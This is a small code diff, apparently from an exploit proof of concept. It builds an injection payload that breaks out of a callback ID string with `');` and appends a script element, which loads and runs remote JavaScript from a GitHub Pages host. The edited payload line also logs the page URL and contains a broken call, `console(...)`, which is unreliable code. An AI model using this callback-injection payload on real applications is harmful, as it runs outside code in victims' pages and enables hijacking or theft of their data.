@@ -18,7 +18,7 @@
             }
         });
         const currUrl = location.href;
-        const payload = `s=document.createElement('script'),s.src='https://seuercc.github.io/26/campaign.js',s.onload=()=>alert('JS'),document.head.appendChild(s)`;
+        const payload = `console.log(location.href);s=document.createElement('script'),s.src='https://seuercc.github.io/26/campaign.js',s.onload=()=>console('JS load succeed'),document.head.appendChild(s)`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         // 缓存回调函数
